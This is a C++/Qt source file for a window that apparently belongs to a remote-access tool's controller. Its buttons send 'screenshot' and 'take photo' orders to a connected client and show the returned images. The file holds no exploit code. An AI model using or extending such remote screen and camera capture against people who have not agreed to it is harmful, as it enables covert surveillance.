#include "myscreenwindows.h"
#include <QMessageBox>
#include <QApplication>
#include <QDesktopWidget>
#include "tool.h"

myscreenWindows::myscreenWindows(QWidget *parent,netManager* nm): QWidget(parent)
{
    setAttribute(Qt::WA_DeleteOnClose, true);
    this->nm=nm;

    b_screen=new QPushButton(this);
    b_photo=new QPushButton(this);

    l_image=new QLabel(this);
    scrollArea=new QScrollArea(this);

    b_screen->setText("截图");
    b_photo->setText("拍照");

    l_image->setText("图片无法显示");
    scrollArea->setWidget(l_image);

    connect(b_screen, SIGNAL(clicked(bool)), this, SLOT(screen()));
    connect(b_photo, SIGNAL(clicked(bool)), this, SLOT(takephoto()));


    const int w = 800, hh = 600;
    const int x = (QApplication::desktop()->width() - w) >> 1;
    const int y = (QApplication::desktop()->height() - hh) >> 1;
    this->setGeometry(x, y, w, hh);
    //设置显示的位置和大小
//    setFixedSize(this->width(), this->height());
    //设置不可调节大小
    this->setWindowTitle("Image "+tool::GetAddressBySocket(nm->sClient));
    this->setWindowIcon(QIcon(":/image/image/screen.png"));
//    this->setWindowFlags(this->windowFlags()& ~Qt::WindowMaximizeButtonHint);
    //隐藏最大最小按钮
    v=new QVBoxLayout();
    h=new QHBoxLayout();
    h_image=new QHBoxLayout();

    h_image->addWidget(scrollArea);
    h->addWidget(b_screen,1);
    h->addWidget(b_photo,1);
    v->addLayout(h_image,5);
    v->addLayout(h);

    this->setLayout(v);


    connect(nm,SIGNAL(signalAddImage(QString)),this,SLOT(addImage(QString)));



}

myscreenWindows::~myscreenWindows(){
    nm->screenwinodws=nullptr;

//    disconnect(nm,SIGNAL(signalAddImage(QString)),this,SLOT(addImage(QString)));
//    l_image->clear();

//    delete[] h_image;
//    delete[] h;
//    delete[] v;

//    h_image = nullptr;
//    h = nullptr;
//    v = nullptr;

}

void myscreenWindows::screen(){

    morder tmporder;
    tmporder.orderType=60;
    tmporder.orderMem=nullptr;

    tmporder.orderSize=0;

    nm->orderQueue.push(tmporder);
    nm->addOrder();

}


void myscreenWindows::takephoto(){

    morder tmporder;
    tmporder.orderType=61;
    tmporder.orderMem=nullptr;

    tmporder.orderSize=0;

    nm->orderQueue.push(tmporder);
    nm->addOrder();

}

void myscreenWindows::addImage(QString filename){
    QImage image;
    QPixmap img;
    image.load(filename);

    img = QPixmap::fromImage(image.scaled(QSize(image.width(),image.height()),Qt::KeepAspectRatio));

    l_image->clear();
    l_image->resize(img.width(),img.height());
    l_image->setPixmap(img);
}

